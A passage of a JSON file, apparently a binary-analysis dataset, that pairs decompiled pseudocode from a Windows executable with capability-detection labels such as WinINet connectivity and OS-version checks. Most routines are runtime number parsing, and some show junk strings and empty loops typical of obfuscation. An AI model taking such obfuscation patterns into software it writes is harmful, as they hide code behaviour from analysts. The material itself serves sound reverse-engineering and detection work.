((arg_1ch == 0x61) || (arg_1ch == 0x41)) {\n                    uVar2 = fcn.004c4d4c(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar2, arg_2ch, \n                                         arg_2ch_00);\n                    return uVar2;\n                }\n                arg_1ch = arg_1ch + -0x45;\n            }\n            else {\n                arg_1ch = arg_1ch + -0x65;\n            }\n            if (arg_1ch == 0) {\n                uVar2 = fcn.004c511e(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar2, arg_2ch, \n                                     arg_2ch_00);\n            }\n            else if (arg_1ch == 1) {\n                uVar2 = fcn.004c538a(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, arg_2ch, arg_2ch_00);\n            }\n            else {\n                uVar2 = fcn.004c5575(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar2, arg_2ch_00, \n                                     arg_2ch);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 990
    },
    "004041fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.004041fb(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack128;\n    int32_t iStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450fa0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(\"shigueqgukseqfkcoynekrssagnrmojhhfhwqiqmxugs\");\n    uStack24 = 3;\n    fcn.00401e79(\"tfrctczljnfzoqlhagwrvgdrwirqohkcfjlndmykocsgjkgdrbpszrnuaqhftjnfxngofnlnhjcdofjzfugyhu\");\n    for (iStack116 = 0x31; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    for (iStack120 = 0x5b; 0 < iStack120; iStack120 = iStack120 + -1) {\n    }\n    for (iStack124 = 0x45; 0 < iStack124; iStack124 = iStack124 + -1) {\n    }\n    for (iStack128 = 0x18; 0 < iStack128; iStack128 = iStack128 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x547124;\n}\n",
        "token_count": 436
    },
    "00404205": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404205(uchar *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "00404246": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404246(int32_t param_1)\n\n{\n    if (*(param_1 + 0x14) != '\\0') {\n        fcn.0040640b(*(param_1 + 8));\n        *(param_1 + 0x14) = 0;\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "0040426e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040426e(uint arg_8h)\n\n{\n    int32_t iStack40;\n    \n    for (iStack40 = 0x38; 0 < iStack40; iStack40 = iStack40 + -1) {\n    }\n    fcn.00403b02();\n    return *0x546974;\n}\n",
        "token_count": 79
    },
    "0040428c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040428c(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((*(param_1 + 0x1c) != 0) && (*(param_1 + 0x1c) != 7)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 107
    },
    "004042be": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004042be(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004038a0(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 351
    },
    "004042c3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004042c3(uint8_t *arg_8h, uint8_t **arg_ch, uint32_t arg_10h, uint *arg_14h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint8_t *var_8h;\n    uint var_1h;\n    \n    cVar2 = '\\0';\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uVar1 = *arg_8h;\n    puVar7 = arg_8h;\n    while (iVar3 = fcn.00405d9e(uVar1),  iVar3 != 0) {\n        puVar7 = puVar7 + 1;\n        uVar1 = *puVar7;\n    }\n    var_1h._0_1_ = *puVar7;\n    if ((var_1h == 0x2d) || (var_1h == 0x2b)) {\n        puVar7 = puVar7 + 1;\n    }\n    else {\n        var_1h._0_1_ = 0x2b;\n    }\n    if (((arg_10h < 0) || (arg_10h == 1)) || (0x24 < arg_10h)) {\n        if (arg_ch == NULL) {\n            return 0;\n        }\n        *arg_ch = arg_8h;\n        return 0;\n    }\n    var_8h = puVar7;\n    if (arg_10h < 1) {\n        uVar1 = *puVar7;\n        if (uVar1 != 0x30) {\n            arg_10h = 10;\n            goto code_r0x00484209;\n        }\n        if ((puVar7[1] != 0x78) && (puVar7[1] != 0x58)) {\n            arg_10h = 8;\n            goto code_r0x00484202;\n        }\n        arg_10h = 0x10;\ncode_r0x0048421b:\n        puVar7 = puVar7 + 2;\n        var_8h = puVar7;\n    }\n    else if (((arg_10h == 0x10) && (*puVar7 == 0x30)) && ((puVar7[1] == 0x78 || (puVar7[1] == 0x58))))\n    goto code_r0x0048421b;\n    for (; uVar1 = *puVar7,  uVar1 == 0x30; puVar7 = puVar7 + 1) {\ncode_r0x00484202:\n    }\ncode_r0x00484209:\n    var_10h = 0;\n    uVar9 = 0;\n    puVar8 = puVar7;\n    while( true ) {\n        uVar6 = uVar9;\n        uVar9 = arg_10h;\n        uVar4 = fcn.004044c6(uVar1);\n        iVar3 = fcn.00405574(0x554b38, uVar4, uVar9);\n        if (iVar3 == 0) break;\n        cVar2 = iVar3 + -0x38;\n        puVar8 = puVar8 + 1;\n        uVar1 = *puVar8;\n        uVar9 = uVar6 * arg_10h + cVar2;\n        var_10h = uVar6;\n    }\n    if (var_8h == puVar8) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n        return 0;\n    }\n    iVar3 = (puVar8 + -*(arg_10h + 0x554b60)) - puVar7;\n    if ((iVar3 < 0) ||\n       (((puVar8 + -*(arg_10h + 0x554b60) == puVar7 || iVar3 < 0 && (uVar6 - cVar2 <= uVar6)) &&\n        ((uVar6 - cVar2) / arg_10h == var_10h)))) {\n        if (var_1h == 0x2d) {\n            uVar6 = -uVar6;\n        }\n    }\n    else {\n        puVar5 = fcn.00403a35();\n        *puVar5 = 0x22;\n        if (arg_14h != NULL) {\n            *arg_14h = 1;\n        }\n        uVar6 = 0xffffffff;\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = puVar8;\n        return uVar6;\n    }\n    return uVar6;\n}\n",
        "token_count": 1139
    },
    "004042eb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_16h\n\nvoid __cdecl fcn.004042eb(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t unaff_EBP;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_78h;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.00405434(0x88);\n    iVar8 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0x1c);\n    piVar5 = fcn.00404b3d(*(unaff_EBP + 0x1c));\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x578000)(unaff_EBP + -0x78);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x68) == 0) {\n        *(unaff_EBP + -0x90) = 0;\n    }\n    else {\n        uVar12 = fcn.0040574f();\n        *(unaff_EBP + -0x90) = uVar12 & 0xffff;\n    }\n    piVar5 = fcn.00403e2c(*(unaff_EBP + -0x80));\n    pcVar2 = *(*piVar5 + 0x2c);\n    (**0x578000)(0x554800, 0x55481b, unaff_EBP + -0x48);\n    (*pcVar2)();\n    puVar10 = *(unaff_EBP + -0x94);\n    *(unaff_EBP + -0x84) = puVar10;\n    cVar3 = fcn.0040650f(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 == *(unaff_EBP + -0x1a)) {\n            *puVar10 = 0x2b;\n        }\n        else {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00405141();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x1c)) goto code_r0x00472635;\n            *puVar10 = 0x2d;\n        }\n        *(unaff_EBP + -0x84) = puVar10 + 1;\n        fcn.004027f7();\n    }\ncode_r0x00472635:\n    uVar12 = *(unaff_EBP + 0x18) & 0xe00;\n    *(unaff_EBP + -0x80) = 10;\n    if (uVar12 == 0x400) {\n        uVar11 = 8;\n    }\n    else if (uVar12 == 0x800) {\n        uVar11 = 0x10;\n    }\n    else {\n        uVar11 = -(uVar12 != 0) & 10;\n    }\n    *(unaff_EBP + -0x7a) = 0;\n    cVar3 = fcn.0040650f(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        if (*(iVar8 + 6) != *(unaff_EBP + -0x48)) goto code_r0x0047270b;\n        *(unaff_EBP + -0x79) = 1;\n        *(unaff_EBP + -0x8c) = 1;\n        fcn.004027f7();\n        cVar3 = fcn.0040650f(*(unaff_EBP + -0x88));\n        if (cVar3 != '\\0') {\ncode_r0x00472702:\n            if (uVar11 == 0) {\n                uVar11 = 8;\n                goto code_r0x0047271e;\n            }\n            goto code_r0x0047271a;\n        }\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 != *(unaff_EBP + -0x16)) {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00405141();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x18)) goto code_r0x00472702;\n        }\n        if ((uVar11 != 0) && (uVar11 != 0x10)) goto code_r0x0047271a;\n        uVar11 = 0x10;\n        *(unaff_EBP + -0x79) = 0;\n        *(unaff_EBP + -0x8c) = 0;\n        fcn.004027f7();\ncode_r0x0047271e:\n        *(unaff_EBP + -0x80) = ((uVar11 != 8) - 1 & 0xfffffff2) + 0x16;\n    }\n    else {\ncode_r0x0047270b:\n        *(unaff_EBP + -0x79) = 0;\n        *(unaff_EBP + -0x8c) = 0;\n        if (uVar11 != 0) {\ncode_r0x0047271a:\n            if (uVar11 != 10) goto code_r0x0047271e;\n        }\n    }\n    fcn.0040375b(1, *(unaff_EBP + -0x8c));\n    *(unaff_EBP + -4) = 1;\n    iVar13 = 0;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x94) + 0x1f;\n    cVar3 = fcn.0040650f(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        do {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00405141();\n            }\n            uVar12 = fcn.00404c78(unaff_EBP + -0x48, *(iVar8 + 6));\n            if (uVar12 < *(unaff_EBP + -0x80)) {\n                cVar1 = *(unaff_EBP + -0x7a);\n                cVar3 = *(uVar12 + 0x554800);\n                pcVar9 = *(unaff_EBP + -0x84);\n                *pcVar9 = cVar3;\n                if (((cVar1 != '\\0') || (cVar3 != '0')) && (pcVar9 < *(unaff_EBP + -0x8c))) {\n                    *(unaff_EBP + -0x7a) = 1;\n                    *(unaff_EBP + -0x84) = pcVar9 + 1;\n                }\n                iVar6 = unaff_EBP + -0x60;\n                *(unaff_EBP + -0x79) = 1;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (*(iVar6 + iVar13) != '\\x7f') {\n                    iVar6 = unaff_EBP + -0x60;\n                    if (0xf < *(unaff_EBP + -0x4c)) {\n                        iVar6 = *(unaff_EBP + -0x60);\n                    }\n                    *(iVar6 + iVar13) = *(iVar6 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar12 = *(unaff_EBP + -0x4c);\n                iVar6 = *(unaff_EBP + -0x60);\n                iVar7 = unaff_EBP + -0x60;\n                if (0xf < uVar12) {\n                    iVar7 = iVar6;\n                }\n                if ((*(iVar7 + iVar13) == '\\0') || (*(unaff_EBP + -0x90) == 0)) goto code_r0x00472856;\n                iVar4 = *(iVar8 + 6);\n                if (*(iVar8 + 4) == '\\0') {\n                    fcn.00405141();\n                    iVar4 = *(iVar8 + 6);\n                    uVar12 = *(unaff_EBP + -0x4c);\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (iVar4 != *(unaff_EBP + -0x90)) goto code_r0x00472856;\n                fcn.00404543(0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.004027f7();\n            cVar3 = fcn.0040650f(*(unaff_EBP + -0x88));\n        } while (cVar3 == '\\0');\n        uVar12 = *(unaff_EBP + -0x4c);\n        iVar6 = *(unaff_EBP + -0x60);\ncode_r0x00472856:\n        if (iVar13 != 0) {\n            iVar8 = unaff_EBP + -0x60;\n            if (0xf < uVar12) {\n                iVar8 = iVar6;\n            }\n            if (*(iVar8 + iVar13) < '\\x01') {\n                cVar3 = '\\0';\n                goto code_r0x0047287a;\n            }\n            iVar13 = iVar13 + 1;\n        }\n    }\n    else {\n        uVar12 = *(unaff_EBP + -0x4c);\n        iVar6 = *(unaff_EBP + -0x60);\n    }\n    cVar3 = *(unaff_EBP + -0x79);\ncode_r0x0047287a:\n    pcVar9 = unaff_EBP + -0x78;\n    if (0xf < *(unaff_EBP + -100)) {\n        pcVar9 = *(unaff_EBP + -0x78);\n    }\n    if (cVar3 == '\\0') {\ncode_r0x004728f1:\n        puVar10 = *(unaff_EBP + -0x94);\n    }\n    else {\n        while ((iVar13 != 0 && (cVar3 = *pcVar9,  cVar3 != '\\x7f'))) {\n            iVar13 = iVar13 + -1;\n            if (iVar13 != 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < uVar12) {\n                    uVar12 = *(unaff_EBP + -0x4c);\n                    *(unaff_EBP + -0x80) = *(unaff_EBP + -0x60);\n                }\n                iVar6 = *(unaff_EBP + -0x60);\n                if (cVar3 != *(*(unaff_EBP + -0x80) + iVar13)) goto code_r0x004728f1;\n            }\n            if (iVar13 == 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    *(unaff_EBP + -0x80) = iVar6;\n                }\n                uVar12 = *(unaff_EBP + -0x4c);\n                if (cVar3 < **(unaff_EBP + -0x80)) goto code_r0x004728f1;\n            }\n            if ('\\0' < pcVar9[1]) {\n                pcVar9 = pcVar9 + 1;\n            }\n        }\n        puVar10 = *(unaff_EBP + -0x84);\n        if (*(unaff_EBP + -0x7a) == '\\0') {\n            *puVar10 = 0x30;\n            puVar10 = puVar10 + 1;\n        }\n    }\n    *puVar10 = 0;\n    fcn.00402a0e();\n    fcn.00402a0e();\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 3005
    },
    "004042f5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x004845c4)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.004042f5(uint8_t *arg_8h, uint8_t **arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    int64_t iVar10;\n    uint64_t uVar11;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uVar3 = *arg_8h;\n    puVar7 = arg_8h;\n    while (iVar4 = fcn.00405d9e(uVar3),  iVar4 != 0) {\n        puVar7 = puVar7 + 1;\n        uVar3 = *puVar7;\n    }\n    var_2h._0_1_ = *puVar7;\n    if ((var_2h == 0x2d) || (var_2h == 0x2b)) {\n        puVar7 = puVar7 + 1;\n    }\n    else {\n        var_2h._0_1_ = 0x2b;\n    }\n    if (((arg_10h < 0) || (arg_10h == 1)) || (0x24 < arg_10h)) {\n        if (arg_ch == NULL) {\n            return 0;\n        }\n        *arg_ch = arg_8h;\n        return 0;\n    }\n    if (arg_10h < 1) {\n        if (*puVar7 != 0x30) {\n            arg_10h = 10;\n            goto code_r0x00484505;\n        }\n        if ((puVar7[1] != 0x78) && (puVar7[1] != 0x58)) {\n            arg_10h = 8;\n            goto code_r0x00484505;\n        }\n        arg_10h = 0x10;\n    }\n    else if (((arg_10h != 0x10) || (*puVar7 != 0x30)) || ((puVar7[1] != 0x78 && (puVar7[1] != 0x58))))\n    goto code_r0x00484505;\n    puVar7 = puVar7 + 2;\ncode_r0x00484505:\n    uVar3 = *puVar7;\n    puVar8 = puVar7;\n    while (uVar3 == 0x30) {\n        puVar8 = puVar8 + 1;\n        uVar3 = *puVar8;\n    }\n    var_2h._1_1_ = '\\0';\n    puVar9 = puVar8;\n    uVar11 = 0;\n    uVar2 = 0;\n    while( true ) {\n        uVar1 = uVar11;\n        iVar4 = arg_10h;\n        uVar5 = fcn.004044c6(uVar3);\n        iVar4 = fcn.00405574(\"0123456789abcdefghijklmnopqrstuvwxyz\", uVar5, iVar4);\n        if (iVar4 == 0) break;\n        var_2h._1_1_ = iVar4 + 'l';\n        iVar10 = fcn.00402685();\n        puVar9 = puVar9 + 1;\n        uVar3 = *puVar9;\n        uVar11 = iVar10 + var_2h._1_1_;\n        uVar2 = uVar1;\n    }\n    if (puVar7 == puVar9) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n        return 0;\n    }\n    iVar4 = (puVar9 + -*(arg_10h + 0x554bbc)) - puVar8;\n    if ((iVar4 < 0) ||\n       (((puVar9 + -*(arg_10h + 0x554bbc) == puVar8 || iVar4 < 0 && (uVar1 - var_2h._1_1_ <= uVar1)) &&\n        (uVar11 = fcn.00404840(uVar1 - var_2h._1_1_, arg_10h, 0),  uVar11 == uVar2)))) {\n        if (var_2h == 0x2d) {\n            uVar1 = CONCAT44(-((uVar1 >> 0x20) + (uVar1 != 0)), -uVar1);\n        }\n    }\n    else {\n        puVar6 = fcn.00403a35();\n        *puVar6 = 0x22;\n        if (arg_14h != NULL) {\n            *arg_14h = 1;\n        }\n        uVar1 = 0xffffffffffffffff;\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = puVar9;\n        return uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 1210
    },
    "0040433b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040433b(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_14h;\n    int32_t iVar1;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    fcn.004058a8(arg_10h);\n    if ((arg_8h < -1) || (0xff < arg_8h)) {\n        if (*(*var_1ch + (arg_8h >> 8 & 0xffU) * 2) < 0) {\n            var_10h._2_1_ = 0;\n            arg_14h = 2;\n            var_10h._0_1_ = arg_8h >> 8;\n            var_10h._1_1_ = arg_8h;\n        }\n        else {\n            var_10h._1_1_ = 0;\n            arg_14h = 1;\n            var_10h._0_1_ = arg_8h;\n        }\n        var_ch = 0;\n        var_8h._0_2_ = 0;\n        iVar1 = fcn.004012a3(&var_1ch, 1, &var_10h, arg_14h, &var_ch, var_1ch[2], 1);\n        if (iVar1 == 0) {\n            if (var_14h != '\\0') {\n                *(var_20h + 0x350) = *(var_20h + 0x350) & 0xfffffffd;\n            }\n            goto code_r0x004d4aaa;\n        }\n    }\n    if (var_14h != '\\0') {\n        *(var_20h + 0x350) = *(var_20h + 0x350) & 0xfffffffd;\n    }\ncode_r0x004d4aaa:\n    fcn.004030bc(arg_10h);\n    return;\n}\n",
        "token_count": 503
    },
    "0040435e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040435e(uint32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = param_1;\n    if ((*(param_1 + 0x3c) == '\\0') && (iVar3 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar2 = fcn.0040105a(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar2 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            cVar1 = fcn.0040170d(var_4h);\n            if (cVar1 == '\\0') {\n                *(param_1 + 0x18) = 0xffffffff;\n            }\n            else {\n                *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n            }\n            arg_ch = arg_ch + iVar2;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.004040ed(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, param_1 + 0xc);\n    }\n    return 1;\n}\n",
        "token_count": 393
    },
    "004043c2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004043c2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    code *pcVar3;\n    uchar uVar4;\n    char cVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    int32_t iVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00405434(0x48);\n    pcVar2 = *(unaff_EBP + 0x14);\n    iVar11 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 8);\n    cVar5 = *pcVar2;\n    *(unaff_EBP + -0x48) = *(unaff_EBP + 0xc);\n    pcVar9 = pcVar2;\n    cVar1 = cVar5;\n    while (cVar1 != '\\0') {\n        if (cVar1 == cVar5) {\n            iVar11 = iVar11 + 1;\n        }\n        pcVar9 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n    }\n    *(unaff_EBP + -0x3c) = iVar11;\n    fcn.0040375b(iVar11, 0);\n    *(unaff_EBP + -4) = 1;\n    uVar6 = fcn.00404f70(1);\n    *(unaff_EBP + -0x4c) = uVar6;\n    *(unaff_EBP + -4) = 2;\n    uVar6 = fcn.00403616(unaff_EBP + -0x50);\n    *(unaff_EBP + -0x38) = uVar6;\n    *(unaff_EBP + -4) = 0;\n    fcn.00405146();\n    *(unaff_EBP + -0x40) = 0xfffffffe;\n    uVar10 = 1;\n    *(unaff_EBP + -0x30) = 1;\n    while( true ) {\n        uVar12 = 0;\n        iVar11 = 0;\n        *(unaff_EBP + -0x29) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        if (*(unaff_EBP + 